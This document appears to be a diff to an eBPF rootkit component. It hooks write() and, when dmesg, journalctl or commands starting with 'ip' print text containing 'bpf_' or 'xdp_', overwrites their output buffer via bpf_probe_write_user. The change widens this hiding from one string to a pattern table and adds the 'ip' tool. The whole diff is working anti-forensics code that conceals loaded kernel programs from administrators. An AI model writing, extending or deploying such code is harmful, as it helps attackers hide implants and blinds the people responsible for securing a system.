@@ -5,9 +5,20 @@
 #include <bpf/bpf_core_read.h>
 
 #define MAX_BUF 200
-#define TARGET "bpf_"
-#define TARGET_LEN (sizeof(TARGET) - 1)
+#define MAX_PATTERNS 2
+#define MAX_PATTERN_LEN 32
 #define PATCH_KEY 0
+
+typedef struct {
+    char pattern[MAX_PATTERN_LEN];
+    uint32_t len;
+} StaticPattern;
+
+// You can add more patterns here
+const StaticPattern patterns[MAX_PATTERNS] = {
+    { "bpf_", sizeof("bpf_") - 1 },
+    { "xdp_", sizeof("xdp_") - 1 }
+};
 
 struct {
     __uint(type, BPF_MAP_TYPE_PERCPU_ARRAY);
@@ -29,7 +40,8 @@ int BPF_KPROBE(trace_write)
     bpf_get_current_comm(&comm, sizeof(comm));
 
     if (__builtin_strncmp(comm, "dmesg", 5) != 0 &&
-        __builtin_strncmp(comm, "journalctl", 10) != 0) {
+        __builtin_strncmp(comm, "journalctl", 10) != 0 &&
+        __builtin_strncmp(comm, "ip", 2) != 0) {
         return 0;
     }
 
@@ -49,11 +61,13 @@ int BPF_KPROBE(trace_write)
     if (!patch)
         return 0;
 
-    u32 limit = count > TARGET_LEN ? count - TARGET_LEN : 0;
-    for (u32 i = 0; i < limit; i++) {
-        if (__builtin_memcmp(&data[i], TARGET, TARGET_LEN) == 0) {
-            bpf_probe_write_user((void *)buf, patch, count);
-            return 0;
+    for (int p = 0; p < MAX_PATTERNS; p++) {
+        int limit = count > patterns[p].len ? count - patterns[p].len : 0;
+        for (int i = 0; i < limit; i++) {
+            if (__builtin_memcmp(&data[i], patterns[p].pattern, patterns[p].len) == 0) {
+                bpf_probe_write_user((void *)buf, patch, count);
+                return 0;
+            }
         }
     }
 
